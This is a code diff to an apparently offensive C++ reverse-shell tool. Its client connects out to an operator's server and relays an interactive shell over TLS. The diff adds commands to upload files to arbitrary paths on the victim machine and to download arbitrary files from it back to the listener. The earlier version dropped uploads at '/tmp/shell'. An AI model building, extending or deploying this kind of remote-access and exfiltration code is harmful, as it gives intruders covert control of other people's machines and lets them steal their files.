@@ -1,5 +1,7 @@
 #include "utils.h"
 #include "args_parser.h"
+#include "client_utils.h"
+#include "server_utils.h"
 
 // error msgs
 std::string pipeFailed = "[!] Pipe creation failed!";
@@ -58,16 +60,16 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
     std::cout << "[+] Server listening on " << serverIpAddr << ":" << portNum << std::endl;
 
     // get info on connecting client
-    struct sockaddr_storage clientAddr;
+    struct sockaddr_storage clientAddr{};
     socklen_t clientAddrLen = sizeof(clientAddr);
     char clientIpAddr[INET_ADDRSTRLEN];
 
-    OPENSSL_init_ssl(0, NULL);
+    OPENSSL_init_ssl(0, nullptr);
 
     int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
 
     // get some info for server user
-    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
+    auto *s = reinterpret_cast<struct sockaddr_in *>(&clientAddr);
     int clientPort = ntohs(s->sin_port); // converts byte to port number
     inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
     std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;
@@ -109,14 +111,33 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
         if (FD_ISSET(clientSocket, &fdSet)) {
             // read incoming data
             ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
+            std::string tmpStr(ttyBuffer, bytesReceived);
             // if no data, client has disconnected and we can exit
             if (bytesReceived <= 0) {
                 std::cout << "[!] Client disconnected" << std::endl;
                 break;
             }
-            // print output from client
-            std::cout.write(ttyBuffer, bytesReceived);
-            std::cout.flush();
+            if (tmpStr.find("download") != std::string::npos) {
+
+                char pathToWrite[4096];
+                SSL_read(ssl, &pathToWrite, sizeof(pathToWrite));
+
+                std::vector<std::byte> incomingFile = handleIncomingFile(ssl);
+
+                if (!incomingFile.empty()) {
+                    writeBytesToFile(incomingFile, std::string(pathToWrite));
+                    std::cout << "[+] Downloaded file to: " << std::string(pathToWrite) << std::endl;
+                }
+                else {
+                    std::cout << "[!] An error occurred in transmission!" << std::endl;
+                }
+            }
+            else {
+                // print output from client
+                std::cout.write(ttyBuffer, bytesReceived);
+                std::cout.flush();
+            }
+
         }
 
         // Data from input -> to then send to client
@@ -127,20 +148,28 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
             if (input > 0) {
                 // if input is 'exit' we know we want to quit
                 std::string inputCmd(ttyBuffer, input);
+
                 if (inputCmd.find("exit") != std::string::npos) {
                     // execute shutdown
                     safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket, ssl, ctx);
                 }
                 else if (inputCmd.find("upload") != std::string::npos) {
 
-                    std::vector<std::byte> fileBuffer = readFileAsByteVector(parseUploadCommand(ttyBuffer));
+                    fileTransfer transferCfg = s_parseCommand(ttyBuffer);
 
-                    prepareAndSendFile(ssl, fileBuffer, "upload");
+                    std::vector<std::byte> fileBuffer = readFileAsByteVector(transferCfg.pathToRead);
+
+                    prepareAndUpload(ssl, fileBuffer, transferCfg.type, transferCfg.pathToWrite);
 
                 }
                 else if (inputCmd.find("download") != std::string::npos) {
-                    // send download to client with file path intending to download
-                    // client reads as bytes, prepares and sends, we handle incoming here
+
+                    // Send download to client with local file on client machine, and path to write on this machine
+                    // wait for a response that contains (fileBytes)
+
+                    fileTransfer transferCfg = s_parseCommand(ttyBuffer);
+
+                    s_prepareClientToDownload(ssl, transferCfg.type, transferCfg.pathToRead, transferCfg.pathToWrite);
                 }
                 else {
                     // if not 'exit' send to client
@@ -157,7 +186,6 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
     close(clientSocket);
     close(serverSocket);
 }
-
 
 void client(const std::string &ipAddr, unsigned int portNum) {
 
@@ -233,17 +261,32 @@ void client(const std::string &ipAddr, unsigned int portNum) {
             // the masterfD, infact we upload the file to the server
             // we should be expecting a second incoming connection ..
             std::string tmpStr(ttyBuffer, bytesReceived);
-            if (tmpStr.find("upload")  != std::string::npos) {
+            fileTransfer transferCfg;
 
-                std::vector<std::byte> incomingFile = handleIncomingFile(ssl, "upload");
+            if (tmpStr.find("upload") != std::string::npos ) {
+
+                char pathToWrite[4096];
+                SSL_read(ssl, &pathToWrite, sizeof(pathToWrite));
+                transferCfg.pathToWrite = std::string(pathToWrite);
+
+                std::vector<std::byte> incomingFile = handleIncomingFile(ssl);
+
                 if (!incomingFile.empty()) {
-                    writeBytesToFile(incomingFile, "/tmp/shell");
+                    writeBytesToFile(incomingFile, transferCfg.pathToWrite);
                 }
                 else {
                     std::cout << "[!] An error occured in transmission!" << std::endl;
                 }
+            }
+            else if (tmpStr.find("download") != std::string::npos) {
 
-            }else {
+                transferCfg = c_handleDownloadRequest(ssl);
+
+                std::vector<std::byte> fileBuffer = readFileAsByteVector(transferCfg.pathToRead);
+
+                prepareAndUpload(ssl, fileBuffer, transferCfg.type, transferCfg.pathToWrite);
+            }
+            else {
                 // ssl not required here as were just writing to local shell
                 write(masterFd, ttyBuffer, bytesReceived);
             }
@@ -255,7 +298,10 @@ void client(const std::string &ipAddr, unsigned int portNum) {
             // read input from local chell
             ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
             // check we actually have some data
-            if (n > 0) {
+            std::string clientTtyBufferStr(ttyBuffer, n);
+            // check were processing a download and if so don't send the tty buffer
+            // as this will interfere with the download process
+            if (n > 0 && clientTtyBufferStr.find("download") == std::string::npos) {
                 // use ssl to send it to the server
                 SSL_write(ssl, ttyBuffer, n);
             }
@@ -268,7 +314,6 @@ void client(const std::string &ipAddr, unsigned int portNum) {
     close(masterFd);
     wait(nullptr);
 }
-
 
 int main(const int argc, char *argv[]) {
 
